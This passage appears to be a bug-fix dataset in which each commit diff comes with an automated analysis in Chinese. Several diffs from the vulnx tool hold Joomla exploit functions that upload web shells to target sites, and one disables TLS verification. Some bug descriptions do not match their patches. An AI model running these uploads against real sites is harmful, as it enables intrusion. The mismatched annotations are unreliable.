{"id": "bugfix001", "buggy_file": "data/raw_new/bugfix001_buggy.py", "fixed_file": "data/raw_new/bugfix001_fixed.py", "meta": {"repo": "GantMan/nsfw_model", "file": "nsfw_detector/predict.py", "buggy_sha": "7014aba25b3ec24be442394a7b049e1b058a99f4", "fixed_sha": "fbd8fdc632e66352f83e54fd3ff594824d5717cc", "commit_message": "Merge pull request #104 from OttomanZ/master\n\nBug Fixes", "changes": 3, "patch": "@@ -49,12 +49,11 @@ def load_images(image_paths, image_size, verbose=True):\n     \n     return np.asarray(loaded_images), loaded_image_paths\n \n-\n def load_model(model_path):\n     if model_path is None or not exists(model_path):\n     \traise ValueError(\"saved_model_path must be the valid directory of a saved model to load.\")\n     \n-    model = tf.keras.models.load_model(model_path, custom_objects={'KerasLayer': hub.KerasLayer})\n+    model = tf.keras.models.load_model(model_path, custom_objects={'KerasLayer': hub.KerasLayer},compile=False)\n     return model\n \n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_compile_false_for_load_model", "bug_description": "在加载TensorFlow模型时，buggy_code版本缺少compile=False参数，这会导致在某些情况下（特别是当原始模型使用了自定义损失函数或优化器时）加载模型失败并抛出异常。fixed版本通过添加compile=False参数来避免编译模型，从而解决了这个运行时错误。"}}}
{"id": "bugfix002", "buggy_file": "data/raw_new/bugfix002_buggy.py", "fixed_file": "data/raw_new/bugfix002_fixed.py", "meta": {"repo": "GantMan/nsfw_model", "file": "setup.py", "buggy_sha": "03a69c4aa582e25ea137d706d99dccd14b79bf3f", "fixed_sha": "4fd58f6e4097cb95e0760a5da8fce8cbec803537", "commit_message": "Merge pull request #58 from ezavesky/fix/mobilenet\n\nFix/mobilenet", "changes": 23, "patch": "@@ -18,12 +18,7 @@\n EMAIL = 'gantman@gmail.com'\n AUTHOR = 'Gant Laborde'\n REQUIRES_PYTHON = '>=3.5.0'\n-VERSION = '1.0.0'\n-\n-# What packages are required for this module to be executed?\n-REQUIRED = [\n-    'keras'\n-]\n+VERSION = '1.1.0'\n \n # What packages are optional?\n EXTRAS = {\n@@ -37,6 +32,16 @@\n \n here = os.path.abspath(os.path.dirname(__file__))\n \n+# Import the requirements.\n+REQUIRED = []\n+try:\n+    with io.open(os.path.join(here, 'requirements.txt'), encoding='utf-8') as f:\n+        for line_req in f:\n+            if line_req[0] != '#':\n+                REQUIRED.append(line_req.strip())\n+except FileNotFoundError:\n+    REQUIRED = []\n+\n # Import the README and use it as the long-description.\n # Note: this will only work if 'README.md' is present in your MANIFEST.in file!\n try:\n@@ -125,6 +130,10 @@ def run(self):\n     ],\n     # $ setup.py publish support.\n     cmdclass={\n-        'upload': UploadCommand,\n+        'upload': UploadCommand\n     },\n+    entry_points=\"\"\"\n+        [console_scripts]\n+        nsfw-predict=nsfw_detector.predict:main\n+    \"\"\"\n )", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_console_script_entry_point", "bug_description": "buggy_code 缺少 console_scripts 入口点定义，导致无法通过命令行调用 nsfw-predict 命令。fixed_code 添加了 entry_points 配置，使得用户可以通过命令行直接运行 nsfw-predict 命令来使用该工具。"}}}
{"id": "bugfix003", "buggy_file": "data/raw_new/bugfix003_buggy.py", "fixed_file": "data/raw_new/bugfix003_fixed.py", "meta": {"repo": "sfujim/TD3", "file": "DDPG.py", "buggy_sha": "1204ff85c4afc314158eb044eff50887b94c879b", "fixed_sha": "0316ba96948bd5473a160b67b775fc6ef1b473a9", "commit_message": "bug fix on critic input", "changes": 4, "patch": "@@ -98,7 +98,7 @@ def train(self, replay_buffer, iterations, batch_size=64, discount=0.99, tau=0.0\n \t\t\ttarget_Q = reward + (done * discount * target_Q)\r\n \r\n \t\t\t# Get current Q estimate\r\n-\t\t\tcurrent_Q = self.critic([state, action])\r\n+\t\t\tcurrent_Q = self.critic(state, action)\r\n \r\n \t\t\t# Compute critic loss\r\n \t\t\tcritic_loss = self.criterion(current_Q, target_Q)\r\n@@ -131,4 +131,4 @@ def save(self, filename, directory):\n \r\n \tdef load(self, filename, directory):\r\n \t\tself.actor.load_state_dict(torch.load('%s/%s_actor.pth' % (directory, filename)))\r\n-\t\tself.critic.load_state_dict(torch.load('%s/%s_critic.pth' % (directory, filename)))\n\\ No newline at end of file\n+\t\tself.critic.load_state_dict(torch.load('%s/%s_critic.pth' % (directory, filename)))\r", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_critic_forward_call", "bug_description": "在buggy_code中，critic网络的调用方式错误：self.critic([state, action]) 将state和action作为列表传递，但Critic类的forward方法需要两个独立的参数(x, u)。这会导致运行时TypeError异常。fixed_code修正为self.critic(state, action)，正确传递两个独立参数。"}}}
{"id": "bugfix004", "buggy_file": "data/raw_new/bugfix004_buggy.py", "fixed_file": "data/raw_new/bugfix004_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "vulnx.py", "buggy_sha": "12875425b34ed460ecbed8ad10bb9821bc585c53", "fixed_sha": "91b59507d986b52b2d18204ba739b80df1fcfa17", "commit_message": "#83 fix the add input argument.", "changes": 38, "patch": "@@ -31,6 +31,13 @@\n import signal\n import requests\n \n+HEADERS = {\n+    'User-Agent': random_UserAgent(),\n+    'Content-type' : '*/*',\n+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n+    'Accept-Language': 'en-US,en;q=0.5',\n+    'Connection': 'keep-alive',\n+}\n \n warnings.filterwarnings(\n     action=\"ignore\", message=\".*was already imported\", category=UserWarning)\n@@ -93,7 +100,7 @@ def parse_args():\n def detection():\n     instance = CMS(\n         url,\n-        headers=headers,\n+        headers=HEADERS,\n         exploit=args.exploit,\n         domain=args.subdomains,\n         webinfo=args.webinfo,\n@@ -108,7 +115,7 @@ def dork_engine():\n     if args.dorks:\n         DEngine = Dork(\n             exploit=args.dorks,\n-            headers=headers,\n+            headers=HEADERS,\n             pages=(args.numberpage or 1)\n             )\n         DEngine.search()\n@@ -122,7 +129,7 @@ def dorks_manual():\n \n def interactive_cli():\n     if args.cli:\n-        cli = CLI(headers=headers)\n+        cli = CLI(headers=HEADERS)\n         cli.general(\"\")\n \n def signal_handler(signal, frame):\n@@ -133,13 +140,6 @@ def signal_handler(signal, frame):\n \n if __name__ == \"__main__\":\n \n-    headers = {\n-        'User-Agent': random_UserAgent(),\n-        'Content-type' : '*/*',\n-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n-        'Accept-Language': 'en-US,en;q=0.5',\n-        'Connection': 'keep-alive',\n-    }\n     dork_engine()\n     dorks_manual()\n     interactive_cli()\n@@ -152,4 +152,20 @@ def signal_handler(signal, frame):\n         else:\n             url = 'http://'+root\n             print(url)\n-        detection()\n\\ No newline at end of file\n+        detection()\n+\n+    if input_file:\n+        with open(input_file,'r') as urls:\n+            u_array = [url.strip('\\n') for url in urls]\n+            try:\n+                for url in u_array:\n+                    root = url\n+                #url condition entrypoint\n+                    if root.startswith('http'):\n+                        url = root\n+                    else:\n+                        url = 'http://'+root\n+                    detection()\n+                    urls.close()\n+            except Exception as error:\n+                print('error : '+error)\n\\ No newline at end of file", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "headers_scope_error", "bug_description": "在buggy_code中，headers变量在if __name__ == \"__main__\"块内定义，但dork_engine()、dorks_manual()和interactive_cli()函数在headers定义之前被调用，导致NameError异常。fixed_code将headers移到全局作用域作为常量HEADERS，并添加了处理输入文件的功能。"}}}
{"id": "bugfix005", "buggy_file": "data/raw_new/bugfix005_buggy.py", "fixed_file": "data/raw_new/bugfix005_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "modules/detector.py", "buggy_sha": "9707b28975076872d2ba5dd2be5ff41bda11b34f", "fixed_sha": "a2e86a8f954b0beefef6c0c07eeaa142d8ffb6f7", "commit_message": "#77 fix set unsecure requests.", "changes": 6, "patch": "@@ -44,14 +44,14 @@ def __init__(\n     \n     def __getlmcontent__(self):\n         lm_content = self.url + '/smiley/1.gif'\n-        return requests.get(lm_content, self.headers).text\n+        return requests.get(lm_content, headers=self.headers,verify=False).text\n \n     def __getlm2content__(self):\n         lm2_content = self.url + '/rss.xml'\n-        return requests.get(lm2_content, self.headers).text\n+        return requests.get(lm2_content, headers=self.headers,verify=False).text\n     \n     def __getcontent__(self):\n-        return requests.get(self.url, self.headers).text\n+        return requests.get(self.url, headers=self.headers,verify=False).text\n \n     def __getexploit__(self):\n         if self.exploit:", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "ssl_verification_error", "bug_description": "在buggy_code中，requests.get()调用时没有禁用SSL证书验证，当目标网站使用自签名证书或无效SSL证书时会导致SSLError异常。fixed_code通过添加verify=False参数禁用了SSL证书验证，确保程序能够正常访问使用非标准SSL证书的网站。"}}}
{"id": "bugfix006", "buggy_file": "data/raw_new/bugfix006_buggy.py", "fixed_file": "data/raw_new/bugfix006_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "cli.py", "buggy_sha": "687b92e28ca6ecf462aee9003c530cef337b8c32", "fixed_sha": "203fa0cd055c4e501bec5a2cfae6e8ff14ca06b1", "commit_message": "Merge pull request #71 from anouarbensaad/v2.0/dev\n\n==VULNX MODE== | Fix Screen listing dorks.", "changes": 130, "patch": "@@ -1,4 +1,5 @@\n import sys\n+\n import time\n import os\n import re\n@@ -79,14 +80,17 @@ def _url_action_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n+        help/?                  Show this help menu.\n         timeout                 set timeout\n         ports                   scan ports\n         domain                  get domains & sub domains\n         cms info                get cms info (version , user ..)\n         web info                get web info\n         dump dns                dump dns get sub domains [mx-server..]\n         run exploit             run exploits corresponding to cms\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -97,9 +101,12 @@ def _dorks_action_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n+        help/?                  Show this help menu.\n         list                    list dorks\n         set dork                set exploit name\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -108,10 +115,13 @@ def _dorks_setdork_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n+        help/?                  Show this help menu.\n         pages                   set num page\n         output                  output file.\n-        run                     search web with specified dork \n+        run                     search web with specified dork\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -120,9 +130,12 @@ def _dorks_setdork_page_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n+        help/?                  Show this help menu.\n         output                  output file.\n-        run                     search web with specified dork \n+        run                     search web with specified dork\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -131,9 +144,12 @@ def _dorks_setdork_output_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n+        help/?                  Show this help menu.\n         pages                   set num page\n-        run                     search web with specified dork \n+        run                     search web with specified dork\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -142,8 +158,11 @@ def _dorks_setdork_page_output_help():\n         print(\"\"\"\n         Command                 Description\n         --------                -------------\n-        ?                       Help menu\n-        run                     search web with specified dork \n+        help/?                  Show this help menu.\n+        run                     search web with specified dork\n+        clear/cls               clear the vulnx screen\n+        history                 Display command-line most important history from the beginning.\n+        variables               Prints all previously specified variables.\n         back                    move back from current context\n         \"\"\")\n \n@@ -187,6 +206,16 @@ def setPage(page):\n         if page:\n             return int(page)\n \n+    @staticmethod\n+    def setOutput(directory):\n+        output=r'^output (\\w+$)'\n+        try:\n+            rep=re.search(re.compile(output),directory).group(1)\n+        except AttributeError:  # No match is found\n+            rep=re.search(re.compile(output),directory)\n+        if rep:\n+            return rep\n+\n     @property\n     def getUrl(self,pattern):\n         url_search=r'^set url (.+)'\n@@ -197,48 +226,109 @@ def getUrl(self,pattern):\n         if url:\n             return url#ParseURL(url)\n \n+    def variable(self):\n+        print(\"a\")\n+\n     def setdorkCLI(self,cmd_interpreter):\n         \n+        # REGEX\n+\n+        output=re.compile(r'^output \\w+$')\n+        page=re.compile(r'^page \\d+$')\n+        dorkname=re.compile(r'^set dork .+')\n+        \n         '''SET DORK VARIABLE'''\n+        \n         while True:\n-            dorkname=re.compile(r'^set dork .+')\n             cmd_interpreter=input(\"%s%svulnx%s%s (%sDorks%s)> %s\" %(bannerblue2,W_UL,end,W,B,W,end))\n             if cmd_interpreter == 'back':\n                 break\n             if cmd_interpreter == 'list':\n             \n                 '''SET DORK LIST'''\n+\n                 print('\\n%s[*]%s Listing dorks name..' %(B,end))\n                 from modules.dorksEngine import DorkList as DL\n                 DL.dorkslist()\n-            \n+            if cmd_interpreter=='clear' or cmd_interpreter=='cls':\n+                Cli._clearscreen()\n+            if cmd_interpreter=='exit':\n+                sys.exit()\n+            if cmd_interpreter == 'help' or cmd_interpreter == '?':\n+                Helpers._dorks_action_help()\n+\n                 '''SET DORK NAME.'''\n-            elif dorkname.search(cmd_interpreter):\n+\n+            if dorkname.search(cmd_interpreter):\n                 while True:\n                     cmd_interpreter_wp=input(\"%s%svulnx%s%s (%sDorks-%s%s)> %s\" %(bannerblue2,W_UL,end,W,B,Cli.getDork(cmd_interpreter),W,end))\n-                    page=re.compile(r'^page \\d+$')\n-                    \n+\n                     '''SET PAGE VARIABLE.'''\n+\n                     if page.search(cmd_interpreter_wp):\n                         while True:\n                             cmd_interpreter_wp_page=input(\"%s%svulnx%s%s (%sDorks-%s-%s%s)> %s\" %(bannerblue2,W_UL,end,W,B,Cli.getDork(cmd_interpreter),Cli.setPage(cmd_interpreter_wp),W,end))\n+                            \n+                            if output.search(cmd_interpreter_wp_page):\n+                                while True:\n+                                    cmd_interpreter_wp_page_output=input(\"%s%svulnx%s%s (%sDorks-%s-%s%s)> %s\" %(bannerblue2,W_UL,end,W,B,Cli.getDork(cmd_interpreter),Cli.setPage(cmd_interpreter_wp),W,end))\n+                                    \n+                                    if cmd_interpreter_wp_page_output=='run':\n+                                        print('\\n')\n+                                        from modules.dorksEngine import Dorks as D\n+                                        D.searchengine(Cli.getDork(cmd_interpreter),headers,Cli.setOutput(cmd_interpreter_wp),Cli.setPage(cmd_interpreter_wp))\n+                                    if cmd_interpreter_wp_page_output=='back':\n+                                        break\n+                                    if cmd_interpreter_wp_page_output=='help' or cmd_interpreter_wp_page_output=='?':\n+                                        Helpers._dorks_setdork_page_output_help()\n+                                    if cmd_interpreter_wp_page_output=='clear' or cmd_interpreter_wp_page_output=='cls':\n+                                        Cli._clearscreen()\n+                                    if cmd_interpreter_wp_page_output=='exit':\n+                                        sys.exit()\n+\n                             if cmd_interpreter_wp_page=='run':\n                                 print('\\n')\n                                 from modules.dorksEngine import Dorks as D\n                                 D.searchengine(Cli.getDork(cmd_interpreter),headers,output_dir,Cli.setPage(cmd_interpreter_wp))\n                             if cmd_interpreter_wp_page=='back':\n                                 break\n-            \n+                            if cmd_interpreter_wp_page=='help' or cmd_interpreter_wp_page=='?':\n+                                Helpers._dorks_setdork_page_help()\n+                            if cmd_interpreter_wp_page=='clear' or cmd_interpreter_wp_page=='cls':\n+                                Cli._clearscreen()\n+                            if cmd_interpreter_wp_page=='exit':\n+                                sys.exit()\n+\n+                    '''SET OUTPUT VARIABLE.'''\n+\n+                    if output.search(cmd_interpreter_wp):\n+                        while True:\n+                            cmd_interpreter_wp_output=input(\"%s%svulnx%s%s (%sDorks-%s%s)> %s\" %(bannerblue2,W_UL,end,W,B,Cli.getDork(cmd_interpreter),W,end))\n+                            if cmd_interpreter_wp_output=='run':\n+                                print('\\n')\n+                                from modules.dorksEngine import Dorks as D\n+                                D.searchengine(Cli.getDork(cmd_interpreter),headers,Cli.setOutput(cmd_interpreter_wp),numberpage)\n+                            if cmd_interpreter_wp_output=='back':\n+                                break\n+                            if cmd_interpreter_wp_output=='clear' or cmd_interpreter_wp_output=='cls':\n+                                Cli._clearscreen()\n+                            if cmd_interpreter_wp_output=='exit':\n+                                sys.exit()\n+                            if cmd_interpreter_wp_output=='help' or cmd_interpreter_wp_output=='?':\n+                                Helpers._dorks_setdork_output_help()\n+\n                     if cmd_interpreter_wp=='run':\n                         print('\\n')\n                         from modules.dorksEngine import Dorks as D\n                         D.searchengine(Cli.getDork(cmd_interpreter),headers,output_dir,numberpage)\n-            \n                     if cmd_interpreter_wp=='back':\n                         break\n-            \n-            if cmd_interpreter == 'help' or cmd_interpreter == '?':\n-                Helpers._dorks_action_help()\n+                    if cmd_interpreter_wp=='help' or cmd_interpreter_wp=='?':\n+                        Helpers._dorks_setdork_help()\n+                    if cmd_interpreter_wp=='clear' or cmd_interpreter_wp=='cls':\n+                        Cli._clearscreen()\n+                    if cmd_interpreter_wp=='exit':\n+                        sys.exit()\n \n \n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_url_root_assignment", "bug_description": "在buggy_code中，当用户输入的URL不以'http'开头时，代码尝试使用未定义的变量'url_root'来构建完整URL，这会导致NameError运行时异常。fixed_code通过正确赋值'url_root = root'修复了这个问题。"}}}
{"id": "bugfix007", "buggy_file": "data/raw_new/bugfix007_buggy.py", "fixed_file": "data/raw_new/bugfix007_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "modules/dnsLookup.py", "buggy_sha": "4f964914da1aa8c6b8e491cadb615f09f6484417", "fixed_sha": "9ddc7f61aaa6c09341af563d8d3b98d473fff455", "commit_message": "Merge pull request #69 from anouarbensaad/v2.0/dev\n\n#65 #63 #57 Fix match csrfmiddlewaretoken --dns |[dns dump].", "changes": 7, "patch": "@@ -45,12 +45,13 @@ def text_record(table):\n def dnsdumper(url):\n     domain = hostd(url)\n     dnsdumpster_url = 'https://dnsdumpster.com/'\n-    response = requests.Session().get(dnsdumpster_url).text\n+    response = requests.Session().get(dnsdumpster_url)\n+    soup = BeautifulSoup(response.text, 'html.parser')\n     # If no match is found, the return object won't have group method, so check.\n     try:\n-        csrf_token = re.search(r\"name='csrfmiddlewaretoken' value='(.*?)'\", response).group(1)\n+        csrf_token = soup.findAll('input', attrs={'name': 'csrfmiddlewaretoken'})[0]['value']\n     except AttributeError:  # No match is found\n-        csrf_token = re.search(r\"name='csrfmiddlewaretoken' value='(.*?)'\", response)\n+        csrf_token = soup.findAll('input', attrs={'name': 'csrfmiddlewaretoken'})[0]['value']\n     print (' %s Retrieved token: %s' % (info,csrf_token))\n     cookies = {'csrftoken': csrf_token}\n     headers = {'Referer': 'https://dnsdumpster.com/'}", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "csrf_token_extraction_fix", "bug_description": "在buggy_code中，使用正则表达式从HTML响应中提取CSRF令牌不可靠，当HTML结构变化或令牌格式不匹配时会导致AttributeError。fixed_code改用BeautifulSoup解析HTML并直接查找input元素的值，确保可靠提取CSRF令牌。"}}}
{"id": "bugfix008", "buggy_file": "data/raw_new/bugfix008_buggy.py", "fixed_file": "data/raw_new/bugfix008_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "modules/dorksEngine.py", "buggy_sha": "63ad1996819ecbc68f82902ca16b3287fd49b7e2", "fixed_sha": "ba0437e598ba0e009c6d260e4358aaff35509977", "commit_message": "fix comments.", "changes": 6, "patch": "@@ -1,10 +1,14 @@\n+'''\n+Dorks Engine Module.\n+github Repository : http://github.com/anouarbensaad/findorks\n+'''\n+\n import requests\n import re\n import time\n import random\n import os\n from common.colors import run,W,end,good,bad,que,info,bannerblue\n-from common.requestUp import getrequest as vulnxget\n from common.uriParser import parsing_url as parsify\n filename = time.strftime(\"%Y-%m-%d-%H%M%S-Dorks\")\n output_dirdorks = 'logs'+'/Dorks'", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_import_removal", "bug_description": "buggy_code 中导入了未使用的模块 'common.requestUp.getrequest as vulnxget'，这会导致运行时 ImportError 如果该模块不存在。fixed_code 移除了这个未使用的导入语句，避免了潜在的导入错误。"}}}
{"id": "bugfix009", "buggy_file": "data/raw_new/bugfix009_buggy.py", "fixed_file": "data/raw_new/bugfix009_fixed.py", "meta": {"repo": "anouarbensaad/vulnx", "file": "modules/jooExploits.py", "buggy_sha": "0c625ca6ecf8b1bbcd97cb88984b2a87bb7e9134", "fixed_sha": "3936a0f0c43d0678144993680171737094236045", "commit_message": "Merge pull request #50 from anouarbensaad/v1.6/dev\n\nv1.6_beta6 :: Fix Requests in ps & joo [added new joomla exploits]", "changes": 211, "patch": "@@ -11,10 +11,8 @@\n Session = requests.Session()\n \n from common.colors import failexploit , vulnexploit , que , info , good\n-from common.requestUp import sendrequest as vxpost\n-from common.requestUp import getrequest as vxget\n \n-def joomla_comjce(url,headers,timeout):\n+def com_jce(url,headers):\n     host = hostd(url)\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20\"\n@@ -24,16 +22,16 @@ def joomla_comjce(url,headers,timeout):\n             'Filedata' : [open('shell/VulnX.gif','rb')],\n             'action':'Upload',\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = url + \"/VulnX.gif\"\n     res=requests.get(path_shell, headers).text\n     matches = re.findall(re.compile(r'/image/gif/'),res)\n     if matches:\n-        print (' %s Com Jce               %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_jce               %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s Com Jce               %s' %(que , failexploit))\n+        print (' %s com_jce               %s' %(que , failexploit))\n \n-def joomla_comedia(url,headers,timeout):\n+def com_media(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=\"\n     headers={\"content-type\":[\"form-data\"]}\n@@ -42,16 +40,16 @@ def joomla_comedia(url,headers,timeout):\n     data = {\n             fieldname:shell,\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = endpoint+\"/images/XAttacker.txt\"\n-    response = vxget(path_shell,headers,timeout)\n+    response = requests.get(path_shell,headers).text\n     if re.findall(r'Tig', response):\n-        print (' %s Com Media             %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_media             %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s Com Media             %s' %(que , failexploit))\n+        print (' %s com_media             %s' %(que , failexploit))\n \n \n-def joomla_comjdownloads(url,headers,timeout):\n+def com_jdownloads(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"index.php?option=com_jdownloads&Itemid=0&view=upload\"\n     headers={\"content-type\":[\"form-data\"]}\n@@ -74,15 +72,15 @@ def joomla_comjdownloads(url,headers,timeout):\n         'send':'1', \n         '24c22896d6fe6977b731543b3e44c22f':'1'\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = endpoint+\"/images/jdownloads/screenshots/VulnX.gif?Vuln=X\"\n-    response = vxget(path_shell,headers,timeout)\n+    response = requests.get(path_shell,headers).text\n     if re.findall(r'Vuln X', response):\n-        print (' %s Com Jdownloads        %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_jdownloads        %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s Com Jdownloads        %s' %(que , failexploit))\n+        print (' %s com_jdownloads        %s' %(que , failexploit))\n \n-def joomla_comjdownloads2(url,headers,timeout):\n+def com_jdownloadsb(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"/images/jdownloads/screenshots/VulnX.php\"\n     headers={\"content-type\":[\"form-data\"]}\n@@ -105,13 +103,13 @@ def joomla_comjdownloads2(url,headers,timeout):\n         'send':'1', \n         '24c22896d6fe6977b731543b3e44c22f':'1'\n     }\n-    response = vxget(endpoint,headers,timeout)\n+    response = requests.get(endpoint,headers).text\n     if re.findall(r'200', response):\n-        print (' %s Com Jdownloads2       %s    %s' %(que,vulnexploit,endpoint))\n+        print (' %s com_jdownloads2        %s    %s' %(que,vulnexploit,endpoint))\n     else: \n-        print (' %s Com Jdownloads2       %s' %(que , failexploit))\n+        print (' %s com_jdownloads2        %s' %(que , failexploit))\n \n-def joomla_fabrik2(url,headers,timeout):\n+def com_fabrika(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload\"\n \n@@ -121,15 +119,15 @@ def joomla_fabrik2(url,headers,timeout):\n     data = {\n             fieldname:shell,\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = endpoint+\"/images/XAttacker.txt\"\n-    response = vxget(path_shell,headers,timeout)\n+    response = requests.get(path_shell,headers).text\n     if re.findall(r'Vuln X', response):\n-        print (' %s Com Fabrik2            %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_fabrik1            %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s Com Fabrik2            %s' %(que , failexploit))\n+        print (' %s com_fabrik1            %s' %(que , failexploit))\n \n-def joomla_fabrik2_d(url,headers,timeout):\n+def com_fabrikb(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n     endpoint = url+\"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload\"\n \n@@ -139,23 +137,20 @@ def joomla_fabrik2_d(url,headers,timeout):\n     data = {\n             fieldname:shell,\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = endpoint+\"/images/XAttacker.txt\"\n-    response = vxget(path_shell,headers,timeout)\n+    response = requests.get(path_shell,headers).text\n     if re.findall(r'Tig', response):\n-        print (' %s Com Fabrik2            %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_fabrik2          %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s Com Fabrik2            %s' %(que , failexploit))\n+        print (' %s com_fabrik2          %s' %(que , failexploit))\n \n-def joomla_foxcontact(url,headers,timeout):\n+def com_foxcontact(url,headers):\n     headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'\n-\n #    foxf = {'components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php',\n #            'index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php',\n #            'index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php',\n #            'components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php'}\n-    \n-    \n     endpoint = url+\"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload\"\n \n     headers={\"content-type\":[\"form-data\"]}\n@@ -164,45 +159,45 @@ def joomla_foxcontact(url,headers,timeout):\n     data = {\n             fieldname:shell,\n     }\n-    content = vxpost(endpoint,data,headers,timeout)\n+    content = Session.post(endpoint,data,headers)\n     path_shell = endpoint+\"/images/XAttacker.txt\"\n-    response = vxget(path_shell,headers,timeout)\n+    response = requests.get(path_shell,headers).text\n     if re.findall(r'Tig', response):\n-        print (' %s Fox Contact            %s    %s' %(que,vulnexploit,path_shell))\n+        print (' %s com_foxcontact       %s    %s' %(que,vulnexploit,path_shell))\n     else: \n-        print (' %s fox Contact            %s' %(que , failexploit))\n+        print (' %s com_foxcontact       %s' %(que , failexploit))\n \n-def comadsmanager(url,headers):\n+def com_adsmanager(url,headers):\n     endpoint = url + \"/index.php?option=com_adsmanager&task=upload&tmpl=component\"\n     img = open('shell/VulnX.php', 'rb')\n     name_img= os.path.basename('shell/VulnX.html')\n     files= {'image': (name_img,img,'form-data',{'Expires': '0'}) }\n-    upload_file = Session.post(url,files=files)\n+    upload_file = Session.post(endpoint,files=files)\n     shellup = url + \"/tmp/plupload/VulnX.html\"\n     checkShell = requests.get(shellup).text\n     statusCheck = re.findall(re.compile(r'VulnX'),checkShell)\n     if statusCheck:\n-        print(' %s comadsmanager         %s    %s' %(que,vulnexploit,shellup))\n+        print(' %s com_adsmanager        %s    %s' %(que,vulnexploit,shellup))\n     else:\n-        print(' %s comadsmanager         %s' %(que , failexploit))  \n+        print(' %s com_adsmanager        %s' %(que , failexploit))  \n \n-def comblog(url,headers):\n+def com_blog(url,headers):\n     endpoint = url + \"/index.php?option=com_myblog&task=ajaxupload\"\n     checkShell = requests.get(endpoint).text\n     